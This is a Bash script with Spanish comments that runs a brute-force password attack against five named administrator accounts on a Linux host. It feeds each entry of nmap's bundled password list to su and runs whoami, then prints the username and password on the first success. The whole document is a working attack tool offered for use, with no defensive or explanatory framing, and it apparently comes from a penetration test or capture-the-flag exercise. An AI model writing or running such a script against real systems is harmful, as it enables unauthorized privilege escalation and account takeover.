#!/bin/bash

# --- Configuración ---
# Lista de usuarios administradores a los que atacaremos, extraídos de nuestros hallazgos.
TARGET_USERS=("iesanchez" "jeguzman" "depalacios" "jvmate" "daalas")

# La lista de contraseñas que sabemos que existe en el sistema.
PASSWORD_LIST="/usr/share/nmap/nselib/data/passwords.lst"

# --- Lógica del Script ---

# Verificar si la lista de contraseñas existe
if [ ! -f "$PASSWORD_LIST" ]; then
    echo "[-] Error: La lista de contraseñas no se encontró en $PASSWORD_LIST"
    exit 1
fi

# Bucle principal que recorre cada usuario de nuestra lista
for user in "${TARGET_USERS[@]}"; do
    echo ""
    echo "[*] Iniciando ataque de fuerza bruta contra el usuario: $user"
    echo "-----------------------------------------------------"

    # Bucle interno que prueba cada contraseña para el usuario actual
    while IFS= read -r password; do
        # Imprimir el intento de forma que se sobreescriba en la misma línea
        echo -n "[*] Probando para '$user': $password                                "`echo -ne '\r'`

        # Intentar ejecutar un comando simple ('whoami') como el usuario objetivo
        # Le pasamos la contraseña a 'su' a través de una tubería (pipe)
        echo "$password" | /bin/su -c "whoami" "$user" &> /dev/null

        # Comprobar el código de salida del último comando. 0 significa que tuvo éxito.
        if [ $? -eq 0 ]; then
            echo -e "\n\n[+] ¡¡¡ÉXITO!!! Credenciales encontradas:"
            echo "[+] Usuario:    $user"
            echo "[+] Contraseña: $password"
            echo "-----------------------------------------------------"
            exit 0 # Salir del script por completo al primer éxito
        fi
    done < "$PASSWORD_LIST"

    echo -e "\n[-] Ataque finalizado para '$user'. No se encontró la contraseña en la lista."

done

echo ""
echo "[!!!] ATAQUE GLOBAL FINALIZADO. No se encontró ninguna contraseña válida para los usuarios objetivo."
